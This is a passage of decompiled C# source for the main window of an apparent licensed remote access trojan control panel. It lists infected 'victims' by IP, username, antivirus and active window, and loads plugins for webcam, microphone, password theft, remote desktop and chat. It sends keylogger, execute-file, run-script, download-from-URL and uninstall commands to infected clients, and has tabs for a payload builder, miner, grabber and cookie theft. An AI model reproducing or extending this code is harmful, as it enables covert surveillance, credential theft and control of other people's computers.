	[CompilerGenerated]
	internal virtual ContextMenuStrip vmethod_99()
	{
		return contextMenuStrip_4;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_100(ContextMenuStrip WithEventsValue)
	{
		contextMenuStrip_4 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_101()
	{
		return columnHeader_36;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_102(ColumnHeader WithEventsValue)
	{
		columnHeader_36 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_103()
	{
		return columnHeader_37;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_104(ColumnHeader WithEventsValue)
	{
		columnHeader_37 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_105()
	{
		return columnHeader_38;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_106(ColumnHeader WithEventsValue)
	{
		columnHeader_38 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_107()
	{
		return columnHeader_39;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_108(ColumnHeader WithEventsValue)
	{
		columnHeader_39 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_109()
	{
		return columnHeader_40;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_110(ColumnHeader WithEventsValue)
	{
		columnHeader_40 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_111()
	{
		return columnHeader_41;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_112(ColumnHeader WithEventsValue)
	{
		columnHeader_41 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_113()
	{
		return CfdnxAwScc;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_114(ColumnHeader WithEventsValue)
	{
		CfdnxAwScc = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_115()
	{
		return columnHeader_42;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_116(ColumnHeader WithEventsValue)
	{
		columnHeader_42 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_117()
	{
		return columnHeader_43;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_118(ColumnHeader WithEventsValue)
	{
		columnHeader_43 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_119()
	{
		return columnHeader_44;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_120(ColumnHeader WithEventsValue)
	{
		columnHeader_44 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_121()
	{
		return columnHeader_45;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_122(ColumnHeader WithEventsValue)
	{
		columnHeader_45 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_123()
	{
		return columnHeader_46;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_124(ColumnHeader WithEventsValue)
	{
		columnHeader_46 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_125()
	{
		return columnHeader_47;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_126(ColumnHeader WithEventsValue)
	{
		columnHeader_47 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ContextMenuStrip vmethod_127()
	{
		return contextMenuStrip_5;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_128(ContextMenuStrip WithEventsValue)
	{
		contextMenuStrip_5 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual SaveFileDialog vmethod_129()
	{
		return saveFileDialog_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_130(SaveFileDialog WithEventsValue)
	{
		saveFileDialog_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_131()
	{
		return columnHeader_48;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_132(ColumnHeader WithEventsValue)
	{
		columnHeader_48 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual System.Windows.Forms.Timer vmethod_133()
	{
		return timer_4;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_134(System.Windows.Forms.Timer WithEventsValue)
	{
		EventHandler value = method_137;
		System.Windows.Forms.Timer timer = timer_4;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_4 = WithEventsValue;
		timer = timer_4;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual System.Windows.Forms.Timer vmethod_135()
	{
		return timer_5;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_136(System.Windows.Forms.Timer WithEventsValue)
	{
		timer_5 = WithEventsValue;
	}

	public Form1()
	{
		base.Activated += Form1_Activated;
		base.Deactivate += Form1_Deactivate;
		base.FormClosing += Form1_FormClosing;
		base.Load += Form1_Load;
		base.MouseMove += Form1_MouseMove;
		client1 = null;
		string_3 = null;
		rand = new Random();
		REC = Randomi(8);
		Nresource = Randomi(9);
		V = Randomi(16);
		Binder_Byte = null;
		PPP = -1;
		isActive = false;
		int_0 = 0;
		method_0();
		string_1 = null;
		Binder_ComboBox1.SelectedIndex = 0;
		NETFRAMWORKS.SelectedIndex = 3;
		Binder_Path.PlaceholderText = "Path";
		Notf_pass.Hide();
		NOTF_BRBS1.Hide();
		NOTF_L1_Miner.Hide();
		NOTF_COK.Hide();
		Button1.BackColor = Color.FromArgb(46, 51, 73);
		Button2.BackColor = Color.FromArgb(37, 42, 64);
		Button3.BackColor = Color.FromArgb(37, 42, 64);
		Button4.BackColor = Color.FromArgb(37, 42, 64);
		Button5.BackColor = Color.FromArgb(37, 42, 64);
		Button7.BackColor = Color.FromArgb(37, 42, 64);
		TabControl2.SelectedTab = Connect1;
		Guna2ComboBox1.SelectedIndex = 0;
	}

	public void dsk()
	{
		while (true)
		{
			int num = 0;
			num = Class7.class8_0.int_2 switch
			{
				3 => 7500, 
				2 => 5000, 
				1 => 2000, 
				0 => 10, 
				_ => 10000, 
			};
			if (isActive & ((long)GClass7.smethod_0() < 12000L) & (L1.Columns[0].Width != 0))
			{
				DataGridViewRow[] array = L1.method_3();
				foreach (DataGridViewRow dataGridViewRow in array)
				{
					if (dataGridViewRow == null)
					{
						continue;
					}
					Client client = (Client)dataGridViewRow.Tag;
					if (client == null)
					{
						continue;
					}
					bool flag = false;
					if (DateTime.Compare(client.lastPC, DateTime.MinValue) != 0)
					{
						if (DateAndTime.Now.Subtract(client.lastPC).TotalMilliseconds >= (double)num)
						{
							flag = true;
						}
					}
					else
					{
						flag = true;
					}
					if (!client.Isend && flag)
					{
						client.Isend = true;
						client.lastPC = DateAndTime.Now;
						client.Send("CAP" + Class7.string_1 + Conversions.ToString(L1.Columns[0].Width) + Class7.string_1 + Conversions.ToString(L1.method_6()));
					}
				}
			}
			Thread.Sleep((int)Math.Round((double)num / 2.0));
		}
	}

	public void ESPERA(int INTERVALO)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		while (stopwatch.ElapsedMilliseconds < INTERVALO)
		{
			Application.DoEvents();
		}
		stopwatch.Stop();
	}

	public void Form1_Activated(object sender, EventArgs e)
	{
		isActive = true;
		base.Opacity = 1.0;
	}

	public void Form1_Deactivate(object sender, EventArgs e)
	{
		isActive = false;
		base.Opacity = 0.95;
	}

	public void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		NotifyIcon1.Visible = false;
		try
		{
			Class7.waveOut_0.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Class7.class8_0.method_1();
		ProjectData.EndApp();
	}

	[DllImport("uxtheme", CharSet = CharSet.Unicode)]
	public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

	public void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			string[] array = Strings.Split(Class2.XTBfo6WOm.License.auth_sample.user_data.username, "-");
			Fname.Text = array[0];
			Ftime.Text = Class2.XTBfo6WOm.License.auth_sample.user_data.expires;
			LEVEL.Value = Conversions.ToInteger(Class2.XTBfo6WOm.License.auth_sample.user_data.level);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		SetWindowTheme(ListView1.Handle, "explorer", null);
		SetWindowTheme(ListView2.Handle, "explorer", null);
		SetWindowTheme(ListView_Socket.Handle, "explorer", null);
		SetWindowTheme(List_pass.Handle, "explorer", null);
		pnlNav.Height = Home1.Height;
		pnlNav.Top = Home1.Top;
		pnlNav.Left = Home1.Left;
		try
		{
			TextBox1.Text = Class6.smethod_11("#TextBox1", TextBox1.Text);
			host.Text = Class6.smethod_11("#host", host.Text);
			NameClient.Text = Class6.smethod_11("#vn", NameClient.Text);
			Ports.Text = Conversions.ToString(Class6.smethod_11("#p", Conversions.ToString(Ports.Text)));
			Name_Folder.Text = Class6.smethod_11("Name_Folder", Name_Folder.Text);
			Name_Payload.Text = Class6.smethod_11("#Name_Payload", Name_Payload.Text);
			As1.Text = Class6.smethod_11("#As1", As1.Text.ToString());
			As2.Text = Class6.smethod_11("#As2", As1.Text.ToString());
			As3.Text = Class6.smethod_11("#As3", As1.Text.ToString());
			As4.Text = Class6.smethod_11("#As4", As1.Text.ToString());
			As5.Text = Class6.smethod_11("#As5", As1.Text.ToString());
			Install_Payload.Checked = Conversions.ToBoolean(Class6.smethod_11("#Install_Payload", Install_Payload.Checked.ToString()));
			D1.Checked = Conversions.ToBoolean(Class6.smethod_11("#AllUsersProfile", D1.Checked.ToString()));
			D2.Checked = Conversions.ToBoolean(Class6.smethod_11("#ProgramData", D2.Checked.ToString()));
			D3.Checked = Conversions.ToBoolean(Class6.smethod_11("#UserProfile", D3.Checked.ToString()));
			D4.Checked = Conversions.ToBoolean(Class6.smethod_11("#AppData", D4.Checked.ToString()));
			D5.Checked = Conversions.ToBoolean(Class6.smethod_11("#Windows", D5.Checked.ToString()));
			D6.Checked = Conversions.ToBoolean(Class6.smethod_11("#WinDir", D6.Checked.ToString()));
			D7.Checked = Conversions.ToBoolean(Class6.smethod_11("#Public", D7.Checked.ToString()));
			D8.Checked = Conversions.ToBoolean(Class6.smethod_11("#TEMP", D8.Checked.ToString()));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		string_1 = Class6.smethod_11("ico", string.Empty);
		if (!File.Exists(string_1))
		{
			string_1 = string.Empty;
		}
		if (Operators.CompareString(Convert.ToString(Ports.Text), Conversions.ToString(Class6.smethod_11("port", Conversions.ToString(Ports.Text))), TextCompare: false) != 0)
		{
			Ports.Text = Conversions.ToString(Class6.smethod_11("port", Conversions.ToString(Ports.Text)));
		}
		try
		{
			if (Operators.CompareString(string_1, string.Empty, TextCompare: false) != 0)
			{
				PictureBox_icon.Image = new Icon(Class6.smethod_11("ico", string.Empty)).ToBitmap();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError3 = ex;
			ProjectData.SetProjectError(projectError3);
			string_1 = string.Empty;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Guna2TextBox rndm = Rndm;
			int iLength = 8;
			rndm.Text = GenerateRandomString(ref iLength);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			base.Left = -base.Width + Screen.PrimaryScreen.WorkingArea.Width;
			base.Top = -base.Height + Screen.PrimaryScreen.WorkingArea.Height;
			L1.method_11("Desktop", L1.GEnum0.StretchImage, DataGridViewAutoSizeColumnMode.None);
			L1.method_11("Name", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("IP", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Computer name", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Username", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Admin", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Install Date", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Flag", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Country", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("OS", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Operating System", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Cam", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("AntiVirus", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Ping", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.method_11("Active Window", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
			L1.Columns[0].Width = 35;
			Show();
			System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = false;
			Class7.object_1 = this;
			Text = Class7.string_0;
			NotifyIcon1.Text = Class7.string_0;
			NotifyIcon1.Icon = base.Icon;
			base.ShowInTaskbar = true;
			Pp1.T.Enabled = true;
			string[] files = Directory.GetFiles(Application.StartupPath + "\\FC\\", "*.dll");
			foreach (string fileName in files)
			{
				Class7.Class9 item = new Class7.Class9(new FileInfo(fileName).Name.ToLower());
				Class7.list_1.Add(item);
			}
			string[] array2 = Strings.Split("cam.dll,ch.dll,pw.dll,sc2.dll,mic.dll,Manger.dll", ",");
			foreach (string text in array2)
			{
				if (Class7.smethod_5(text, null) == null)
				{
					Interaction.MsgBox("Missing dll >> " + text);
					switch (Strings.Split(text, ".")[0])
					{
					case "Manger":
						ManagerToolStripMenuItem.Enabled = false;
						break;
					case "mic":
						MicrophoneToolStripMenuItem.Enabled = false;
						break;
					case "sc2":
						RemoteDesktopToolStripMenuItem.Enabled = false;
						break;
					case "pw":
						GetPasswordsToolStripMenuItem.Enabled = false;
						break;
					case "ch":
						OpenChatToolStripMenuItem.Enabled = false;
						break;
					}
				}
			}
			try
			{
				Class7.waveOut_0 = new WaveOut(0);
				Class7.waveOut_0.Open(WaveFormat.Pcm8Khz8BitMono);
				Class7.waveOut_1 = new WaveOut(0);
				Class7.waveOut_1.Open(WaveFormat.Pcm44Khz16BitMono);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				MicrophoneToolStripMenuItem.Enabled = false;
				ProjectData.ClearProjectError();
			}
			Class7.class8_0.method_0();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	public void method_1(object sender, EventArgs e)
	{
		IEnumerator enumerator = null;
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				try
				{
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "CN", new object[1] { false }, null, null, OptimisticSet: false, RValueBase: true);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception projectError = ex;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_2(object sender, EventArgs e)
	{
		IEnumerator enumerator = null;
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[1] { "kl" }, null, null, null, IgnoreReturn: true);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_3(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("ch.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_4(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(L1.SelectedRows[0].Tag), null, "folder", new object[0], null, null, null)))))
			{
				Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(L1.SelectedRows[0].Tag), null, "folder", new object[0], null, null, null))));
			}
			object[] array = new object[1];
			object objectValue = RuntimeHelpers.GetObjectValue(L1.SelectedRows[0].Tag);
			array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[0], null, null, null)));
			object[] array2 = array;
			bool[] array3 = new bool[1] { true };
			NewLateBinding.LateCall(null, typeof(Process), "Start", array2, null, null, array3, IgnoreReturn: true);
			if (array3[0])
			{
				NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, null, null, OptimisticSet: true, RValueBase: true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_5(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count != 0)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				FileName = string.Empty
			};
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				bool bool_ = true;
				byte[] array = Class6.smethod_16(File.ReadAllBytes(openFileDialog.FileName), ref bool_);
				MemoryStream memoryStream = new MemoryStream();
				string text = "rn" + Class7.string_1 + new FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1;
				memoryStream.Write(Class6.smethod_3(ref text), 0, text.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(Class7.smethod_8, 1);
				thread.Start(new object[2]
				{
					memoryStream.ToArray(),
					L1.DefaultCellStyle.ForeColor
				});
			}
		}
	}

	public void method_6(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count != 0)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "EXE|*.exe",
				FileName = string.Empty
			};
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				bool bool_ = true;
				byte[] array = Class6.smethod_16(File.ReadAllBytes(openFileDialog.FileName), ref bool_);
				MemoryStream memoryStream = new MemoryStream();
				string text = "up" + Class7.string_1;
				memoryStream.Write(Class6.smethod_3(ref text), 0, text.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(Class7.smethod_8, 1);
				thread.Start(new object[2]
				{
					memoryStream.ToArray(),
					L1.DefaultCellStyle.ForeColor
				});
			}
		}
	}

	public void method_7(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count != 0)
		{
			script script2 = new script();
			script2.ShowDialog(this);
			if (script2.Code.Length > 0)
			{
				bool bool_ = true;
				byte[] array = Class6.smethod_16(Class6.smethod_3(ref script2.Code), ref bool_);
				MemoryStream memoryStream = new MemoryStream();
				string text = "rn" + Class7.string_1 + script2.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_3(ref text);
				text = "rn" + Class7.string_1 + script2.RunAs + Class7.string_1;
				memoryStream.Write(buffer, 0, Class6.smethod_3(ref text).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(Class7.smethod_8, 1);
				thread.Start(new object[2]
				{
					memoryStream.ToArray(),
					L1.DefaultCellStyle.ForeColor
				});
			}
		}
	}

	public void method_8(object sender, EventArgs e)
	{
		Thread thread = new Thread(Class7.smethod_8, 1);
		object[] array = new object[2];
		string text = "un" + Class7.string_1 + "~";
		array[0] = Class6.smethod_3(ref text);
		array[1] = L1.DefaultCellStyle.ForeColor;
		thread.Start(array);
	}

	public void method_9(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("mic.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_10(object sender, MouseEventArgs e)
	{
		try
		{
			Interaction.AppActivate(Text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_11(object sender, EventArgs e)
	{
		try
		{
			Interaction.AppActivate(Text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_12(object sender, EventArgs e)
	{
		Process.Start(Application.ExecutablePath);
		Close();
	}

	public void method_13(object sender, EventArgs e)
	{
		Close();
	}

	public void method_14(object sender, EventArgs e)
	{
		Thread thread = new Thread(Class7.smethod_8, 1);
		object[] array = new object[2];
		string text = "un" + Class7.string_1 + "@";
		array[0] = Class6.smethod_3(ref text);
		array[1] = L1.DefaultCellStyle.ForeColor;
		thread.Start(array);
	}

	public void method_15(object sender, EventArgs e)
	{
		Thread thread = new Thread(Class7.smethod_8, 1);
		object[] array = new object[2];
		string text = "un" + Class7.string_1 + "!";
		array[0] = Class6.smethod_3(ref text);
		array[1] = L1.DefaultCellStyle.ForeColor;
		thread.Start(array);
	}

	public void method_16(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count != 0)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				FileName = string.Empty
			};
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				bool bool_ = true;
				byte[] array = Class6.smethod_16(File.ReadAllBytes(openFileDialog.FileName), ref bool_);
				MemoryStream memoryStream = new MemoryStream();
				string text = "rn" + Class7.string_1 + new FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1;
				memoryStream.Write(Class6.smethod_3(ref text), 0, text.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(Class7.smethod_8, 1);
				thread.Start(new object[2]
				{
					memoryStream.ToArray(),
					L1.DefaultCellStyle.ForeColor
				});
			}
		}
	}

	public void method_17(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count != 0)
		{
			FURL fURL = new FURL();
			fURL.ShowDialog(this);
			if (fURL.IsOK)
			{
				string text = "rn" + Class7.string_1 + fURL.TextBox2.Text + Class7.string_1 + fURL.TextBox1.Text;
				Thread thread = new Thread(Class7.smethod_8, 1);
				thread.Start(new object[2]
				{
					Class6.smethod_3(ref text),
					Color.Green
				});
			}
		}
	}

	public void method_18(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter New Name", "Rename Victim", string.Empty);
		if (text.Length <= 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				try
				{
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[1] { "prof" + Class7.string_1 + "~" + Class7.string_1 + "vn" + Class7.string_1 + Class6.smethod_7(ref text) }, null, null, null, IgnoreReturn: true);
					dataGridViewRow.Cells[Class7.int_0].Value = text + "_" + Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells[Class7.int_0].Value)), "_")[Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells[Class7.int_0].Value)), "_").Length - 1];
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception projectError = ex;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_19(object sender, EventArgs e)
	{
		try
		{
			int num = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int i = 0; i <= num; i++)
			{
				if (Operators.CompareString(L1.Rows[i].Cells[11].Value.ToString(), "Yes", TextCompare: false) == 0)
				{
					L1.Rows[i].Cells[11].Style.SelectionBackColor = Color.LimeGreen;
				}
			}
			int num2 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int j = 0; j <= num2; j++)
			{
				if (Operators.CompareString(L1.Rows[j].Cells[11].Value.ToString(), "No", TextCompare: false) == 0)
				{
					L1.Rows[j].Cells[11].Style.SelectionBackColor = Color.DarkRed;
				}
			}
			L1.Rows[0].Cells[2].Style.SelectionBackColor = Color.Orange;
			int_0++;
			if (int_0 == 10)
			{
				int_0 = 0;
				UP.Text = Class6.smethod_10(Class7.long_0);
				Label3.Text = Class6.smethod_10(Class7.long_1);
				Class7.long_0 = 0L;
				Class7.long_1 = 0L;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_20(object sender, EventArgs e)
	{
		try
		{
			Pass_len.Text = Conversions.ToString(L1.RowCount) + " PC+";
			Scan_pass.Text = Conversions.ToString(List_pass.Items.Count) + " PC+";
			Mining_len.Text = Conversions.ToString(L1.RowCount) + " PC+";
			Mining_Scan.Text = Conversions.ToString(L1_Miner.Items.Count) + " PC+";
			Grabber_len.Text = Conversions.ToString(L1.RowCount) + " PC+";
			Grabber_Scan.Text = Conversions.ToString(L1_Grabber.Items.Count) + " PC+";
			Cookies_len.Text = Conversions.ToString(L1.RowCount) + " PC+";
			Cookies_scan.Text = Conversions.ToString(Logisx.Items.Count) + " PC+";
			Type typeFromHandle = typeof(PowerStatus);
			PropertyInfo[] properties = typeFromHandle.GetProperties();
			PropertyInfo propertyInfo = properties[3];
			object objectValue = RuntimeHelpers.GetObjectValue(propertyInfo.GetValue(SystemInformation.PowerStatus, null));
			ProgressBar1.Value = Conversions.ToInteger(Operators.MultiplyObject(objectValue, 100));
			PropertyInfo propertyInfo2 = properties[0];
			object objectValue2 = RuntimeHelpers.GetObjectValue(propertyInfo2.GetValue(SystemInformation.PowerStatus, null));
			if (!Operators.ConditionalCompareObjectEqual(objectValue2, 1, TextCompare: false))
			{
			}
			PropertyInfo propertyInfo3 = properties[4];
			RuntimeHelpers.GetObjectValue(propertyInfo3.GetValue(SystemInformation.PowerStatus, null));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_21(object sender, EventArgs e)
	{
		pnlNav.Height = Home1.Height;
		pnlNav.Top = Home1.Top;
		pnlNav.Left = Home1.Left;
		Home1.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = A;
	}

	public void method_22(object sender, EventArgs e)
	{
		Home1.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_23(object sender, EventArgs e)
	{
		pnlNav.Height = Client2.Height;
		pnlNav.Top = Client2.Top;
		Client2.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = B;
	}

	public void method_24(object sender, EventArgs e)
	{
		Client2.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_25(object sender, EventArgs e)
	{
		pnlNav.Height = Builder3.Height;
		pnlNav.Top = Builder3.Top;
		Builder3.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = C;
	}

	public void method_26(object sender, EventArgs e)
	{
		Builder3.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_27(object sender, EventArgs e)
	{
		pnlNav.Height = Logis4.Height;
		pnlNav.Top = Logis4.Top;
		Logis4.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = D;
		if (NONN.Visible)
		{
			NONN.Visible = false;
		}
	}

	public void method_28(object sender, EventArgs e)
	{
		Logis4.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_29(object sender, EventArgs e)
	{
		pnlNav.Height = Settings6.Height;
		pnlNav.Top = Settings6.Top;
		Settings6.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = Miner;
		NOTF_L1_Miner.Hide();
	}

	public void method_30(object sender, EventArgs e)
	{
